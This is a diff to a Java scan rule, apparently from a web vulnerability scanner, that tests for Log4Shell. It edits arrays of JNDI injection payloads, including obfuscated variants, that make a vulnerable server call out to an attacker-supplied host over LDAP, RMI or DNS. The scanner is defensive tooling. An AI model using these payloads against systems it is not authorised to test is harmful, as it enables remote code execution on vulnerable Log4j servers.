@@ -44,21 +44,21 @@ public class Log4ShellScanRule extends AbstractAppParamPlugin {
     private static final String PREFIX_CVE44228 = PREFIX + "cve44228.";
     private static final String PREFIX_CVE45046 = PREFIX + "cve45046.";
     private static final String[] ATTACK_PATTERNS_CVE44228 = {
-        "${jndi:ldap://{0}/abc}",
-        "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{0}/abc}",
-        "${${::-j}ndi:rmi://{0}/abc}",
-        "${jndi:rmi://{0}/abc}",
-        "${${lower:jndi}:${lower:rmi}://{0}/abc}",
-        "${${lower:${lower:jndi}}:${lower:rmi}://{0}/abc}",
-        "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{0}/abc}",
-        "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}://{0}/abc}",
-        "${jndi:dns://{0}/abc}",
-        "${jndi:${lower:l}${lower:d}a${lower:p}://{0}/abc}"
+        "${jndi:ldap://{0}/{0}}",
+        "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{0}/{0}}",
+        "${${::-j}ndi:rmi://{0}/{0}}",
+        "${jndi:rmi://{0}/{0}}",
+        "${${lower:jndi}:${lower:rmi}://{0}/{0}}",
+        "${${lower:${lower:jndi}}:${lower:rmi}://{0}/{0}}",
+        "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{0}/{0}}",
+        "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}://{0}/{0}}",
+        "${jndi:dns://{0}/{0}}",
+        "${jndi:${lower:l}${lower:d}a${lower:p}://{0}/{0}}"
     };
     private static final String[] ATTACK_PATTERNS_CVE45046 = {
-        "${jndi:ldap://127.0.0.1#a.{0}:1389/abc}",
-        "${jndi:ldap://127.0.0.1#a.{0}/abc}",
-        "${jndi:ldap://localhost#a.{0}/abc}"
+        "${jndi:ldap://127.0.0.1#a.{0}:1389/{0}}",
+        "${jndi:ldap://127.0.0.1#a.{0}/{0}}",
+        "${jndi:ldap://localhost#a.{0}/{0}}"
     };
     protected static final int ATTACK_PATTERN_COUNT =
             ATTACK_PATTERNS_CVE44228.length + ATTACK_PATTERNS_CVE45046.length;
